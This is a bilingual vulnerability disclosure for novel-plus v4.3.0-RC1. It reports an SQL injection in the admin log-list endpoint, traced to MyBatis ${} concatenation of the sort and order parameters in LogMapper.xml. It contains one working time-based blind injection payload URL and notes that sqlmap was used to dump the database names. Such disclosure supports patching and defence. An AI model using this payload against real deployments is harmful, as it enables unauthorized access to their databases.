
# SQL injection vulnerability exists in novel-plus v4.3.0-RC1

# The common/log/list interface of the novel-admin subsystem in the novel-plus system has SQL injection vulnerability.

# novel-plus系统novel-admin子系统common/log/list接口存在SQL注入

#### official website: https://novel.xxyopen.com/index.htm
 
#### github: https://github.com/201206030/novel-plus
 
#### Affected version: v4.3.0-RC1
 
#### releases：https://github.com/201206030/novel-plus/releases/tag/v4.3.0-RC1
 

Payload: 
```
http://127.0.0.1:8088/common/log/list?limit=10&offset=0&sort=gmt_create AND (SELECT 1155 FROM (SELECT(SLEEP(5)))YVhZ)&order=desc&operation=&username=
```

Use sqlmap for verification, and retrieve all the database names.

使用sqlmap验证，跑出所有库名：

> information_schema<br>
> novel_plus

![image.png](https://cdn.nlark.com/yuque/0/2024/png/3014908/1705300429943-63dd8aa9-b069-4ef9-865a-f35097ebb128.png#averageHue=%23131313&clientId=uf69594bc-e91d-4&from=paste&height=585&id=u90d64431&originHeight=790&originWidth=2204&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&size=143888&status=done&style=none&taskId=u9eba4599-6ba6-4cf1-b98e-fb6f63c990a&title=&width=1632.5927079230914)

The list interface in LogController calls the queryList method from LogService to query logs.

LogController中list接口调用LogService的queryList方法查询日志；

novel-admin/src/main/java/com/java2nb/common/controller/LogController.java

![image.png](https://cdn.nlark.com/yuque/0/2024/png/3014908/1705298345047-65504545-cadc-4f7e-a387-3bf27d45e880.png#averageHue=%232e2c2b&clientId=uac25bd4d-4807-4&from=paste&height=649&id=ua4f4b94c&originHeight=876&originWidth=1072&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&size=117700&status=done&style=none&taskId=u4da64b9d-e333-4cb9-9c65-9fe8dec5cc1&title=&width=794.0741301694891)

LogServiceImpl calls logMapper to query the logs.

LogServiceImpl中调用logMapper查询日志；

novel-admin/src/main/java/com/java2nb/common/service/impl/LogServiceImpl.java

![image.png](https://cdn.nlark.com/yuque/0/2024/png/3014908/1705298425700-17707c68-bd80-4c5e-bde7-906a3613a22a.png#averageHue=%232e2c2b&clientId=uac25bd4d-4807-4&from=paste&height=651&id=ud9f5f2e3&originHeight=879&originWidth=1030&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&size=112809&status=done&style=none&taskId=u65d05bc8-812c-47f2-a42e-7c78c32fc53&title=&width=762.9630168606099)

In LogMapper, the usage of the $ symbol to concatenate the sort parameter and the order parameter results in an SQL injection vulnerability.

LogMapper中sort参数和order参数使用了$符号来拼接，导致存在SQL注入漏洞；

novel-admin/src/main/resources/mybatis/common/LogMapper.xml

![image.png](https://cdn.nlark.com/yuque/0/2024/png/3014908/1705298554780-94226292-b6f7-441e-96c3-67407b1b25b0.png#averageHue=%2354513a&clientId=uac25bd4d-4807-4&from=paste&height=861&id=u2a7f34e0&originHeight=1162&originWidth=1652&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&size=247962&status=done&style=none&taskId=u985f88b1-2de8-4f2b-b0ec-95e569ef91c&title=&width=1223.7037901492502)






